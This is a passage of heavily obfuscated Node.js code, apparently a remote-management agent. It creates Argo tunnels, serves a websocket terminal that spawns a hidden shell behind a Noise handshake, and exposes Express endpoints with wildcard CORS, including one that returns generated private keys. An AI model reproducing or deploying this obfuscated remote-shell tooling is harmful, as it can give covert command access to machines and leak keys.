                    'message': 'no\x20tunnel\x20found\x20on\x20port\x20' + a + '\x20with\x20domain\x20' + b
                };
        }
        const g = [];
        for (const i of f) {
            i[dP(0x286)] = !![];
            if (i['sock'] !== null)
                try {
                    i['sock'][dP(0x27e)]();
                } catch (j) {
                }
            await i[dP(0x38b)][dP(0x5fd)](() => {
            }), g[dP(0x6aa)]({
                'tunnel_domain': i[dP(0x5ce)],
                'port': i[dP(0x1b6)],
                'created_at': i[dP(0x519)]
            });
        }
        const h = d[dP(0x6ba)](k => !k['stopped']);
        c[dP(0x508)](h['length'], 0x0) ? this[dP(0x589)][dP(0x521)](a, h) : this[dP(0x589)][dP(0xeb)](a);
        for (const k of g) {
            this[dP(0x6ce)][dP(0x6be)](c['Dsimk']('argo\x20tunnel\x20deleted:\x20', k['tunnel_domain']));
        }
        return {
            'status': 'ok',
            'deleted': g[dP(0x3d0)],
            'tunnels': g
        };
    }
    async ['_runLoop'](a, b, c, d) {
        const dQ = a0aI, f = {
                'CHPnD': function (h, i) {
                    return h + i;
                },
                'VtlJJ': 'http://127.0.0.1:',
                'DMkbd': function (h, i, j) {
                    return h(i, j);
                },
                'ApeZn': dQ(0x20e),
                'AQxhe': dQ(0x5d5),
                'MTNrb': function (h, i) {
                    return h !== i;
                }
            }, g = f['CHPnD'](f[dQ(0x39d)], a[dQ(0x1b6)]);
        while (!a[dQ(0x286)]) {
            let h = null;
            try {
                h = await f[dQ(0x666)](a0av, ![], this[dQ(0x6ce)]);
                if (a[dQ(0x286)]) {
                    try {
                        h[dQ(0x27e)]();
                    } catch (i) {
                    }
                    break;
                }
                a[dQ(0x37c)] = h, await new a0ao(h, g, b, c, d, 0x0, this['log'], a[dQ(0x5ce)], ![], { 'printed': !![] })[dQ(0x6cf)]();
            } catch (j) {
                !a['stopped'] && this[dQ(0x6ce)][dQ(0x1f9)](f[dQ(0xc6)](f[dQ(0x5f2)] + a[dQ(0x5ce)], f[dQ(0x324)]) + j[dQ(0x3f8)]);
            } finally {
                if (f[dQ(0x40a)](h, null))
                    try {
                        h[dQ(0x27e)]();
                    } catch (k) {
                    }
                a[dQ(0x37c)] = null;
            }
            !a['stopped'] && await new Promise(l => setTimeout(l, a0aw * 0x3e8));
        }
    }
}
let a0az = null, a0aA = null;
const a0aB = new Promise((a, b) => {
    const dR = a0aI, c = {
            'jPMpp': dR(0x2a6),
            'LletN': dR(0x481),
            'YJIhv': 'Noise\x20WASM\x20module\x20loaded\x20successfully',
            'gDDpA': dR(0x364),
            'CFRfy': function (d) {
                return d();
            }
        };
    try {
        a0w(function (d) {
            const dS = dR;
            if (!d) {
                a0aA = new Error(c[dS(0x60f)]), a0A['warn'](c[dS(0x169)], a0aA[dS(0x3f8)]), a();
                return;
            }
            a0az = d, a0A[dS(0x48b)](c[dS(0xe8)]), a();
        });
    } catch (d) {
        a0aA = d, a0A[dR(0xd5)](c[dR(0x43d)], d[dR(0x3f8)]), c[dR(0x448)](a);
    }
});
process['on']('unhandledRejection', (a, b) => {
    const dT = a0aI, c = { 'Jbwlf': dT(0x41f) };
    a0A[dT(0xdc)](c[dT(0x58c)], a);
}), process['on']('uncaughtException', a => {
    const dU = a0aI, b = { 'STmaN': dU(0x2af) };
    a0A[dU(0xdc)](b[dU(0x5ef)], a), process[dU(0x3e4)](0x1);
});
class a0aC {
    constructor(a, b, c) {
        const dV = a0aI, d = dV(0x4c3)[dV(0x67f)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                this[dV(0x4ac)] = ![];
                continue;
            case '1':
                this[dV(0x547)] = c;
                continue;
            case '2':
                this[dV(0x606)] = a;
                continue;
            case '3':
                this[dV(0x47f)] = null;
                continue;
            case '4':
                this[dV(0x2ee)] = null;
                continue;
            case '5':
                this[dV(0x11d)] = b;
                continue;
            case '6':
                this['hs'] = null;
                continue;
            }
            break;
        }
    }
    async ['init']() {
        const dW = a0aI, a = {
                'qRAVE': dW(0x3b0),
                'LmGdA': dW(0x15c),
                'lrhrE': dW(0x33c),
                'POfLm': dW(0x68a)
            };
        await a0aB;
        if (!a0az)
            throw a0aA || new Error(a['qRAVE']);
        const b = a0az, c = this[dW(0x606)] ? b['constants']['NOISE_ROLE_INITIATOR'] : b[dW(0x211)][dW(0x365)];
        this['hs'] = b[dW(0x22b)](a[dW(0x178)], c);
        const d = Buffer[dW(0x613)](a[dW(0x647)]), f = this[dW(0x11d)] ? Buffer['from'](this[dW(0x11d)], a[dW(0x53d)]) : null, g = this[dW(0x547)] ? Buffer[dW(0x613)](this['expectedRemotePubB64'], dW(0x68a)) : null;
        this['hs'][dW(0x550)](d, f, g, null);
    }
    [a0aI(0x3d1)](a) {
        const dX = a0aI, b = {
                'jqUaL': function (d, f) {
                    return d > f;
                },
                'cChEh': function (d, f) {
                    return d === f;
                },
                'viNsc': function (d, f) {
                    return d === f;
                },
                'ZIOaY': function (d, f) {
                    return d === f;
                }
            };
        if (this['handshakeFinished'])
            return Buffer['alloc'](0x0);
        const c = a0az;
        a && b[dX(0x2b9)](a[dX(0x3d0)], 0x0) && b[dX(0x10f)](this['hs'][dX(0x16c)](), c[dX(0x211)][dX(0x181)]) && this['hs'][dX(0x301)](a);
        if (b[dX(0x10f)](this['hs'][dX(0x16c)](), c[dX(0x211)][dX(0x47c)]))
            return this[dX(0x610)](), Buffer[dX(0x4fd)](0x0);
        if (b['viNsc'](this['hs'][dX(0x16c)](), c['constants'][dX(0x243)])) {
            const d = this['hs']['WriteMessage'](new Uint8Array(0x0));
            return b[dX(0x4ab)](this['hs'][dX(0x16c)](), c[dX(0x211)][dX(0x47c)]) && this[dX(0x610)](), Buffer[dX(0x613)](d);
        }
        return Buffer['alloc'](0x0);
    }
    [a0aI(0x610)]() {
        const dY = a0aI, a = this['hs'][dY(0x315)]();
        this['sendCipher'] = a[0x0], this[dY(0x47f)] = a[0x1], this[dY(0x4ac)] = !![];
        try {
            if (this['hs'])
                this['hs']['free']();
        } catch (b) {
        }
        this['hs'] = null;
    }
    [a0aI(0x3bf)](a) {
        const dZ = a0aI, b = { 'wglmm': dZ(0xd0) };
        if (!this[dZ(0x4ac)])
            throw new Error(b['wglmm']);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer['from'](this[dZ(0x2ee)][dZ(0x416)](c, d));
    }
    ['decrypt'](a) {
        const e0 = a0aI, b = { 'nWAna': e0(0x191) };
        if (!this['handshakeFinished'])
            throw new Error(b[e0(0x644)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[e0(0x613)](this[e0(0x47f)][e0(0x4dd)](c, d));
    }
    [a0aI(0x50f)]() {
        const e1 = a0aI, a = { 'lFOYQ': e1(0xca) }, b = a[e1(0x152)][e1(0x67f)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                try {
                    if (this[e1(0x47f)])
                        this[e1(0x47f)][e1(0x50f)]();
                } catch (d) {
                }
                continue;
            case '1':
                this['hs'] = null;
                continue;
            case '2':
                this['sendCipher'] = null;
                continue;
            case '3':
                try {
                    if (this['hs'])
                        this['hs']['free']();
                } catch (f) {
                }
                continue;
            case '4':
                try {
                    if (this['sendCipher'])
                        this[e1(0x2ee)]['free']();
                } catch (g) {
                }
                continue;
            case '5':
                this[e1(0x47f)] = null;
                continue;
            }
            break;
        }
    }
}
class a0aD {
    constructor(a, b, c) {
        const e2 = a0aI;
        this[e2(0x5ad)] = a, this[e2(0x1e0)] = b, this[e2(0x391)] = c, this[e2(0x567)] = null, this[e2(0x2fb)] = 0x0, this[e2(0x6b9)] = null, this['_onExitCb'] = null;
    }
    [a0aI(0x344)]() {
        const e3 = a0aI, a = {
                'eCQIX': function (c, d) {
                    return c || d;
                },
                'TiFbG': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'OcBpJ': e3(0x503),
                'ndOwy': e3(0x2eb),
                'hGLcf': 'exit'
            };
        this[e3(0x567)] = a[e3(0x6c4)](a0q, this['shell'], [], {
            'env': this[e3(0x1e0)],
            'cwd': this[e3(0x391)],
            'windowsHide': !![],
            'stdio': [
                e3(0x503),
                a[e3(0x651)],
                a[e3(0x651)]
            ]
        }), this['pid'] = this[e3(0x567)]['pid'] || 0x0;
        const b = this;
        this[e3(0x567)][e3(0x1ac)]['on'](a['ndOwy'], c => b['_emitData'](c)), this[e3(0x567)][e3(0x659)]['on'](a[e3(0x320)], c => b['_emitData'](c)), this[e3(0x567)]['on'](a[e3(0x252)], (c, d) => {
            const e4 = e3;
            if (b[e4(0x5e6)])
                b[e4(0x5e6)]({
                    'exitCode': c,
                    'signal': a[e4(0x2c5)](d, null)
                });
        });
    }
    [a0aI(0x3c0)](a) {
        const e5 = a0aI, b = { 'WhpaJ': 'utf-8' };
        if (this[e5(0x6b9)])
            this[e5(0x6b9)](a[e5(0x406)](b[e5(0x41d)]));
    }
    ['onData'](a) {
        const e6 = a0aI;
        return this[e6(0x6b9)] = a, {
            'dispose': () => {
                const e7 = e6;
                this[e7(0x6b9)] = null;
            }
        };
    }
    [a0aI(0x2ec)](a) {
        const e8 = a0aI;
        return this[e8(0x5e6)] = a, {
            'dispose': () => {
                this['_onExitCb'] = null;
            }
        };
    }
    [a0aI(0x19e)](a) {
        const e9 = a0aI;
        if (!this[e9(0x567)] || !this[e9(0x567)]['stdin'])
            return;
        try {
            this[e9(0x567)]['stdin']['write'](a);
        } catch (b) {
        }
    }
    [a0aI(0x120)]() {
    }
    [a0aI(0x27f)]() {
        const ea = a0aI;
        try {
            if (this[ea(0x567)])
                this[ea(0x567)][ea(0x27f)]();
        } catch (a) {
        }
    }
}
class a0aE {
    constructor() {
        const eb = a0aI, a = { 'aTWBp': eb(0x5a9) }, b = eb(0x6c5)['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['cipher'] = new a0aC(![], this['AGENT_PRIVATE_KEY'], this[eb(0x48a)]);
                continue;
            case '1':
                this['ptyProcess'] = null;
                continue;
            case '2':
                this[eb(0x227)] = !![];
                continue;
            case '3':
                this[eb(0x1b0)] = [];
                continue;
            case '4':
                this[eb(0x367)] = a0K['NOISE_KEYS_INTERNAL']['agent'][eb(0x37f)];
                continue;
            case '5':
                this[eb(0x261)] = [];
                continue;
            case '6':
                this[eb(0x4fe)] = null;
                continue;
            case '7':
                this['phase'] = a['aTWBp'];
                continue;
            case '8':
                this[eb(0x3ef)] = null;
                continue;
            case '9':
                this[eb(0x48a)] = a0K[eb(0x2d8)][eb(0x2ba)]['public_b64'];
                continue;
            }
            break;
        }
    }
    async [a0aI(0x611)]() {
        const ec = a0aI, a = {
                'zpnwz': function (b, c) {
                    return b === c;
                },
                'RizPe': ec(0x6ca),
                'MAKUz': function (b, c) {
                    return b === c;
                }
            };
        this['requestId'] && a0A[ec(0x6be)]('[' + this[ec(0x3ef)] + ec(0x41b));
        if (this[ec(0x20a)]) {
            a[ec(0x49b)](process[ec(0x2ea)], a[ec(0x385)]) && this['ptyProcess'][ec(0x2fb)] && this[ec(0x1b1)](this['ptyProcess'][ec(0x2fb)]);
            try {
                this[ec(0x20a)][ec(0x27f)]();
            } catch (b) {
            }
            this[ec(0x20a)] = null;
        }
        if (this[ec(0x3e6)])
            this['cipher']['free']();
        if (this['websocket'])
            try {
                a[ec(0x2b8)](this[ec(0x4fe)]['readyState'], this[ec(0x4fe)][ec(0x5bc)]) && this['websocket']['close'](0x3e8, 'Cleanly\x20closed');
            } catch (c) {
            } finally {
                this['websocket'] = null;
            }
    }
    [a0aI(0x1b1)](a) {
        const ed = a0aI, b = {
                'XHvft': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b['XHvft'](a0p, ed(0x462) + a, { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    ['_handleRawMessage'](a) {
        const ee = a0aI, b = {
                'nSxfQ': function (c, d) {
                    return c === d;
                },
                'KOKqZ': 'handshake',
                'dUnHX': function (c, d) {
                    return c > d;
                },
                'ZGPSq': function (c, d) {
                    return c(d);
                },
                'ycjLZ': function (c, d) {
                    return c === d;
                },
                'vxRIm': ee(0x1cf)
            };
        if (b['nSxfQ'](this[ee(0x674)], b[ee(0x194)])) {
            if (b['dUnHX'](this['msgResolvers'][ee(0x3d0)], 0x0)) {
                const c = this['msgResolvers']['shift']();
                b[ee(0x180)](c, a);
            } else
                this[ee(0x1b0)][ee(0x6aa)](a);
        } else
            b[ee(0x427)](this[ee(0x674)], b[ee(0x14b)]) && this[ee(0xd2)](a);
    }
    async ['_receiveWsBytes']() {
        const ef = a0aI;
        if (this[ef(0x1b0)][ef(0x3d0)] > 0x0)
            return this[ef(0x1b0)][ef(0x22f)]();
        return new Promise(a => {
            const eg = ef;
            this[eg(0x261)][eg(0x6aa)](a);
        });
    }
    async [a0aI(0x624)](a) {
        const eh = a0aI, b = {
                'gLyxe': function (c, d) {
                    return c(d);
                },
                'cJcdl': eh(0x2a9),
                'HQbWH': function (c, d) {
                    return c > d;
                },
                'QhAOx': '三次握手交互后仍未进入\x20Established\x20状态',
                'XgJCO': function (c, d) {
                    return c(d);
                },
                'dgjbK': '✅\x20Noise\x20握手完成，端到端加密通道已建立！',
                'vepCO': eh(0x151)
            };
        b[eh(0x476)](a, b[eh(0x4be)]);
        try {
            await this[eh(0x3e6)][eh(0x58b)]();
            const c = await this[eh(0x224)](), d = this[eh(0x3e6)]['processHandshake'](c);
            d && b[eh(0x430)](d[eh(0x3d0)], 0x0) && this[eh(0x4fe)]['send'](d);
            const f = await this['_receiveWsBytes']();
            this['cipher']['processHandshake'](f);
            if (!this[eh(0x3e6)][eh(0x4ac)])
                throw new Error(b[eh(0x2d7)]);
            b[eh(0x104)](a, b[eh(0x166)]);
        } catch (g) {
            a('💥\x20握手失败详情:\x20' + g[eh(0x3f8)]);
            throw new Error(b[eh(0x3e3)]);
        }
    }
    [a0aI(0x1a1)]() {
        const ei = a0aI, a = {
                'eNhcl': function (d, f) {
                    return d === f;
                },
                'TTxWM': ei(0x6ca),
                'xukDl': 'C:\x5cWindows',
                'JbjyG': ei(0x203),
                'tqxcD': ei(0x6c7),
                'aVCoB': ei(0x671),
                'NxdPi': ei(0x18c),
                'wxUBc': ei(0x5ed),
                'AfAVF': ei(0x12d),
                'NUliG': ei(0x5c7),
                'sLyTh': ei(0x585)
            };
        if (a[ei(0x26a)](process[ei(0x2ea)], a[ei(0x4f1)])) {
            const d = process.env.SystemRoot || a[ei(0x1ba)], f = [
                    a0n[ei(0x64a)](d, a['JbjyG'], 'WindowsPowerShell', a[ei(0x379)], a[ei(0xfc)]),
                    process.env.COMSPEC,
                    a0n[ei(0x64a)](d, a[ei(0x35f)], a[ei(0x67e)])
                ];
            for (const g of f) {
                if (g && a0l[ei(0x41a)](g))
                    return g;
            }
            return a[ei(0x67e)];
        }
        const b = [
            a['wxUBc'],
            a['AfAVF'],
            a[ei(0x256)]
        ];
        for (const h of b) {
            if (a0l[ei(0x41a)](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l['existsSync'](c))
            return c;
        return a[ei(0x33b)];
    }
    async ['startSession'](a, b, c) {
        const ej = a0aI, d = {
                'mzhUX': ej(0x2a2),
                'lLEVQ': '🔐\x20检测到\x20Token，视为\x20WSS\x20链路，跳过\x20Noise'
            };
        this['websocket'] = a, this[ej(0x3ef)] = b;
        const f = g => a0A[ej(0x6be)]('[终端会话\x20' + b + ']\x20' + g);
        this[ej(0x227)] = !c, f(this[ej(0x227)] ? d[ej(0x5a8)] : d[ej(0xf3)]), a['on']('message', g => this[ej(0x634)](g));
        try {
            this[ej(0x227)] && await this[ej(0x624)](f), await this[ej(0x1ad)](f);
        } catch (g) {
            f(ej(0x646) + g[ej(0x3f8)]), await this[ej(0x611)]();
        }
    }
    async ['_runTerminal'](a) {
        const ek = a0aI, b = {
                'XPVfn': ek(0x3f3),
                'KVWEW': function (g, h) {
                    return g(h);
                },
                'HQQXl': ek(0x4c5),
                'aEZru': ek(0x46f),
                'hJADA': ek(0x289),
                'mSbvL': ek(0x6ca),
                'ZCXMQ': 'unknown',
                'dwfgZ': ek(0x1cf),
                'eEEwo': function (g, h) {
                    return g > h;
                },
                'IvSET': ek(0x107)
            }, c = this[ek(0x1a1)]();
        a(ek(0x58f) + c);
        const d = Object[ek(0x342)]({}, process.env);
        delete d[ek(0x240)], d[ek(0x3ff)] = b['aEZru'];
        if (!d['LANG'])
            d[ek(0x1af)] = b[ek(0x5dc)];
        const f = process.env.USERPROFILE || process.env.HOME || process[ek(0x391)]();
        try {
            const g = {
                'name': b['aEZru'],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': f,
                'env': d
            };
            if (process[ek(0x2ea)] === b[ek(0x523)])
                try {
                    this['ptyProcess'] = a0z[ek(0x344)](c, [], g);
                } catch (h) {
                    b[ek(0x3c2)](a, ek(0x58a) + h['message']), this[ek(0x20a)] = new a0aD(c, d, f), this[ek(0x20a)][ek(0x344)]();
                }
            else
                this['ptyProcess'] = a0z[ek(0x344)](c, [], g);
            b[ek(0x3c2)](a, '🚀\x20终端进程已启动\x20(PID:\x20' + (this[ek(0x20a)][ek(0x2fb)] || b['ZCXMQ']) + ')'), this[ek(0x674)] = b['dwfgZ'];
            while (b['eEEwo'](this[ek(0x1b0)][ek(0x3d0)], 0x0)) {
                const i = this[ek(0x1b0)][ek(0x22f)]();
                this[ek(0xd2)](i);
            }
            this[ek(0x20a)][ek(0x2f9)](j => {
                const el = ek;
                try {
                    let k = Buffer['from'](j, b[el(0x226)]);
                    this[el(0x227)] && this[el(0x3e6)] && this[el(0x3e6)][el(0x4ac)] && (k = this[el(0x3e6)]['encrypt'](k)), this[el(0x4fe)]['readyState'] === 0x1 && this[el(0x4fe)][el(0x1d1)](k);
                } catch (l) {
                }
            }), this[ek(0x20a)]['onExit'](({
                exitCode: j,
                signal: k
            }) => {
                const em = ek;
                b[em(0x3c2)](a, em(0x37b) + j + em(0x19b) + k + ')'), this[em(0x611)]();
            }), this[ek(0x4fe)]['on'](b[ek(0x55f)], () => {
                const en = ek;
                b[en(0x3c2)](a, b[en(0x2bb)]), this[en(0x611)]();
            });
        } catch (j) {
            b[ek(0x3c2)](a, ek(0x1a6) + j[ek(0x3f8)]), await this['cleanup']();
            throw j;
        }
    }
    [a0aI(0xd2)](a) {
        const eo = a0aI, b = {
                'CrbKx': function (c, d) {
                    return c === d;
                },
                'zNLSz': eo(0x608),
                'bjhiQ': function (c, d) {
                    return c === d;
                },
                'eevzC': eo(0x120),
                'CxLJG': eo(0xcb),
                'PTKvl': function (c, d) {
                    return c !== d;
                },
                'CfgxB': eo(0x68a),
                'Rwwnc': 'utf-8'
            };
        if (!this[eo(0x20a)])
            return;
        try {
            const c = Buffer['from'](a);
            let d;
            this[eo(0x227)] ? d = this[eo(0x3e6)][eo(0x36f)](c) : d = c;
            let f = ![], g = d[eo(0x406)]('utf-8');
            if (g['trim']()[eo(0x1bd)]('{'))
                try {
                    const h = JSON[eo(0x65e)](g);
                    f = !![];
                    if (b[eo(0x695)](h[eo(0xec)], b['zNLSz'])) {
                        let i = Buffer[eo(0x613)](JSON[eo(0x1f1)]({ 'type': b[eo(0x670)] }));
                        if (this['useNoise'])
                            i = this[eo(0x3e6)]['encrypt'](i);
                        this['websocket'][eo(0x1d1)](i);
                        return;
                    }
                    if (b[eo(0x4b3)](h[eo(0xec)], b['eevzC'])) {
                        this[eo(0x20a)]['resize'](h[eo(0x392)] || 0x50, h['rows'] || 0x18);
                        return;
                    }
                    if (h['type'] === b[eo(0x4d8)] && b[eo(0x691)](h[eo(0x2eb)], undefined)) {
                        let j = b[eo(0x4b3)](h[eo(0x642)], eo(0x68a)) ? Buffer[eo(0x613)](h[eo(0x2eb)], b[eo(0x6a2)])[eo(0x406)](b['Rwwnc']) : h[eo(0x2eb)];
                        this['ptyProcess'][eo(0x19e)](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[eo(0x20a)][eo(0x19e)](d[eo(0x406)](b[eo(0x4d7)]));
        } catch (l) {
            a0A[eo(0x6be)](eo(0x4d3) + this[eo(0x3ef)] + eo(0x3c7) + l['message']);
            if (this[eo(0x227)])
                this[eo(0x611)]();
        }
    }
}
async function a0aF(a = {}) {
    const ep = a0aI, b = {
            'PIluw': ep(0x555),
            'JCchr': ep(0x3d8),
            'VNHDE': ep(0x417),
            'LAJNu': 'Access-Control-Expose-Headers',
            'RGzUf': ep(0x681),
            'VGrNU': function (c, d) {
                return c === d;
            },
            'CMdBk': 'OPTIONS',
            'AnBhx': function (c) {
                return c();
            },
            'AwyVA': ep(0x189),
            'aXRKa': ep(0xdd),
            'QoSvf': ep(0x5af),
            'cTRKS': ep(0x265),
            'cupxI': function (c, d) {
                return c / d;
            },
            'PQwuA': function (c, d) {
                return c > d;
            },
            'ZniZG': function (c, d) {
                return c - d;
            },
            'pPQJK': ep(0x2a1),
            'kgsFd': function (c, d) {
                return c === d;
            },
            'JPVkP': 'error',
            'YDLkk': function (c, d) {
                return c !== d;
            },
            'zYzos': function (c, d, f) {
                return c(d, f);
            },
            'ajPlV': function (c, d) {
                return c < d;
            },
            'gsXYq': function (c, d) {
                return c(d);
            },
            'WoQBp': function (c, d) {
                return c / d;
            },
            'Vfshn': ep(0x5fa),
            'MNSJe': function (c, d) {
                return c / d;
            },
            'Wrqih': function (c, d) {
                return c - d;
            },
            'qdCOy': ep(0x36e),
            'gUNir': function (c, d) {
                return c === d;
            },
            'aCsNb': 'object',
            'KRluM': ep(0x5b8),
            'nLkUf': function (c, d) {
                return c === d;
            },
            'xOwtD': 'x-file-path',
            'JXZop': function (c, d) {
                return c(d);
            },
            'PvJwI': ep(0x53c),
            'VnJck': ep(0x121),
            'sbCRm': ep(0xda),
            'qrkVk': function (c, d) {
                return c !== d;
            },
            'wwvSN': function (c, d) {
                return c(d);
            },
            'eIqHT': ep(0x502),
            'CNVdr': ep(0x375),
            'TkIzD': ep(0x12f),
            'ylNHx': ep(0x1ee),
            'JzwEE': function (c, d) {
                return c < d;
            },
            'ximXw': function (c, d) {
                return c > d;
            },
            'fEBly': ep(0x334),
            'MFbCE': function (c, d) {
                return c(d);
            },
            'bmqEJ': function (c, d) {
                return c === d;
            },
            'wTgLJ': function (c, d) {
                return c === d;
            },
            'aEneH': function (c, d) {
                return c === d;
            },
            'dRdut': function (c, d) {
                return c < d;
            },
            'euXNp': function (c, d) {
                return c > d;
            },
            'nqYUI': function (c, d) {
                return c ?? d;
            },
            'lhxPL': ep(0x2dd),
            'bIrVJ': ep(0x275),
            'dcmTM': ep(0x400),
            'qaVgE': ep(0x185),
            'ydAaj': ep(0x3c3),
            'sQLMU': ep(0x4cc),
            'EZUmJ': ep(0x565),
            'LUAIq': 'Config\x20validated',
            'lPnWa': ep(0x429),
            'opijM': ep(0x639),
            'DQaEE': 'TempKeyManager\x20initialized',
            'zgMIY': ep(0xd3),
            'urWGW': 'SystemInfoCollector\x20initialized',
            'rVxVK': ep(0x596),
            'zlwuC': function (c) {
                return c();
            },
            'NsHBF': ep(0x5ba),
            'YvBuN': '50mb',
            'qICZw': ep(0xf7),
            'QPCxu': ep(0x6a4),
            'EiZUd': ep(0x262),
            'iQqgz': ep(0x2c3),
            'mtpCW': ep(0x488),
            'SVWDL': '/api/file/authority',
            'UurwZ': ep(0x57c),
            'BKFAp': ep(0x4a3),
            'SEQGu': ep(0x65f),
            'XxuTD': ep(0x415),
            'xMBSZ': ep(0x517),
            'LWskj': ep(0x273),
            'wlZBV': '/api/task/cron',
            'jAodk': '/api/task/status',
            'IjYic': '/api/task/log/onetime',
            'naFsL': '/api/task/log/cron',
            'eKxUB': ep(0x68b),
            'EiBdB': ep(0x266),
            'cCVpN': ep(0x332),
            'JbGQN': ep(0x4ee),
            'gbQAR': ep(0x439),
            'ntgOd': ep(0x17a),
            'eljkR': 'Fatal\x20error\x20in\x20main():'
        };
    try {
        const c = await import(b['ydAaj']);
        a0x = c[ep(0x317)];
        const d = await import('@noble/curves/secp256k1.js');
        a0y = d['secp256k1'], a0A[ep(0x48b)](b['sQLMU']), a0K[ep(0x36b)](a), a0A[ep(0x48b)](b[ep(0x13b)]), a0K['validate'](), a0A[ep(0x48b)](b[ep(0x625)]), a0A['debug'](b[ep(0x1c1)]);
        const f = new a0M(a0K[ep(0x5fb)], a0K[ep(0x6cd)]);
        a0A[ep(0x48b)](b[ep(0xd4)]), a0A['debug'](ep(0x599));
        const g = new a0L();
        a0A[ep(0x48b)](b[ep(0x2d4)]), a0A[ep(0x48b)](b[ep(0x349)]);
        const h = new a0O();
        a0A[ep(0x48b)](b['urWGW']), a0A[ep(0x48b)](b[ep(0x558)]);
        const i = b[ep(0x1a4)](a0f);
        b[ep(0x652)](a0v, i), a0A[ep(0x48b)](b['NsHBF']), i[ep(0x4cd)]((m, n, o) => {
            const eq = ep, p = b[eq(0x1d5)][eq(0x67f)]('|');
            let q = 0x0;
            while (!![]) {
                switch (p[q++]) {
                case '0':
                    n[eq(0x5f6)](b[eq(0x159)], b['VNHDE']);
                    continue;
                case '1':
                    n[eq(0x5f6)](b[eq(0x580)], b['RGzUf']);
                    continue;
                case '2':
                    if (b[eq(0x251)](m['method'], b[eq(0x649)]))
                        return n[eq(0x609)](0xc8)['end']();
                    continue;
                case '3':
                    b[eq(0x2e1)](o);
                    continue;
                case '4':
                    n[eq(0x5f6)](b[eq(0x6bf)], '*');
                    continue;
                case '5':
                    n['header'](b[eq(0x196)], b[eq(0x140)]);
                    continue;
                }
                break;
            }
        }), i[ep(0x4cd)](a0f[ep(0x116)]({
            'type': m => m[ep(0x52a)] !== ep(0x65f),
            'limit': b['YvBuN']
        })), i[ep(0x4cd)](a0f[ep(0x192)]({ 'extended': !![] })), i[ep(0x4cd)](b[ep(0x3a9)](a0N, f, g)), a0A[ep(0x48b)](b[ep(0x1d8)]), i[ep(0x327)](b[ep(0x66f)], async (m, n) => {
            const er = ep, o = {
                    'deqXa': b[er(0x35e)],
                    'Lospm': function (p, q) {
                        const es = er;
                        return b[es(0x578)](p, q);
                    },
                    'YrgPi': er(0x540)
                };
            try {
                const p = Math[er(0x1bb)](b[er(0x578)](Date[er(0x543)](), 0x3e8));
                !a0K[er(0x60e)] || b[er(0x10b)](b[er(0x3b7)](p, a0K['_baseinfo_cache_time']), a0K['BASEINFO_CACHE_TTL']) ? (!a0K[er(0x618)] && (a0K[er(0x618)] = h[er(0xf1)]()[er(0x43a)](r => {
                    const et = er, s = o[et(0x506)][et(0x67f)]('|');
                    let t = 0x0;
                    while (!![]) {
                        switch (s[t++]) {
                        case '0':
                            return r;
                        case '1':
                            a0K[et(0x15f)] = Math[et(0x1bb)](o[et(0x5c0)](Date['now'](), 0x3e8));
                            continue;
                        case '2':
                            a0A[et(0x48b)](o[et(0x69f)]);
                            continue;
                        case '3':
                            a0K[et(0x60e)] = r;
                            continue;
                        case '4':
                            a0K[et(0x618)] = null;
                            continue;
                        }
                        break;
                    }
                })[er(0x5fd)](r => {
                    const eu = er;
                    a0K[eu(0x618)] = null;
                    throw r;
                })), await a0K[er(0x618)]) : a0A[er(0x48b)](b[er(0x264)]);
                const q = { ...a0K[er(0x60e)] };
                b['kgsFd'](m[er(0x173)], ![]) ? (q[er(0x653)] = null, q[er(0x45f)] = null) : (q[er(0x653)] = a0K['SESSION_KEY'], q[er(0x45f)] = a0K[er(0x331)]), n[er(0x170)](q);
            } catch (r) {
                n[er(0x609)](0x1f4)[er(0x170)]({
                    'status': b[er(0x45c)],
                    'message': r[er(0x3f8)]
                });
            }
        }), i[ep(0x327)](b[ep(0x499)], (m, n) => {
            const ev = ep;
            let o = a0K[ev(0x35c)];
            if (b[ev(0x2ac)](m['query'][ev(0x40d)], undefined)) {
                const r = b['zYzos'](parseInt, m['query'][ev(0x40d)], 0xa);
                if (Number['isNaN'](r) || b[ev(0x399)](r, 0x1) || b[ev(0x10b)](r, a0K[ev(0x263)]))
                    return n[ev(0x609)](0x1a6)['json']({ 'error': 'ttl\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x20' + a0K[ev(0x263)] });
                o = r;
            }
            const p = g[ev(0x127)](o), q = s => new Date(s * 0x3e8)[ev(0x149)]()[ev(0x4e4)](ev(0x45e), 'Z');
            n[ev(0x170)]({
                'status': 'ok',
                'key_id': p[ev(0x4d1)],
                'ttl_seconds': p[ev(0x663)],
                'created_at': b['gsXYq'](q, p[ev(0x472)]),
                'expires_at': q(p[ev(0x39e)]),
                'ecdsa': {
                    'private_key': p[ev(0x12b)][ev(0x162)](),
                    'public_key': p[ev(0x108)][ev(0x162)]()
                },
                'ecies': {
                    'private_key': p[ev(0x50e)],
                    'public_key': p[ev(0x4aa)]
                }
            });
        }), i[ep(0x327)](ep(0x1ec), async (m, n) => {
            const ex = ep, o = {
                    'EdwRZ': function (p, q) {
                        const ew = a0b;
                        return b[ew(0x6d1)](p, q);
                    },
                    'uEtTy': b[ex(0x5ac)]
                };
            try {
                const p = Math[ex(0x1bb)](b[ex(0x119)](Date[ex(0x543)](), 0x3e8));
                !a0K[ex(0x2f8)] || b[ex(0x10b)](b[ex(0x366)](p, a0K[ex(0x24f)]), a0K['STATUS_CACHE_TTL']) ? (!a0K[ex(0x403)] && (a0K[ex(0x403)] = h[ex(0x284)]()[ex(0x43a)](r => {
                    const ey = ex;
                    return a0K[ey(0x2f8)] = r, a0K[ey(0x24f)] = Math[ey(0x1bb)](o[ey(0x4e7)](Date[ey(0x543)](), 0x3e8)), a0K['_status_fetch_promise'] = null, a0A[ey(0x48b)](o[ey(0x490)]), r;
                })['catch'](r => {
                    const ez = ex;
                    a0K[ez(0x403)] = null;
                    throw r;
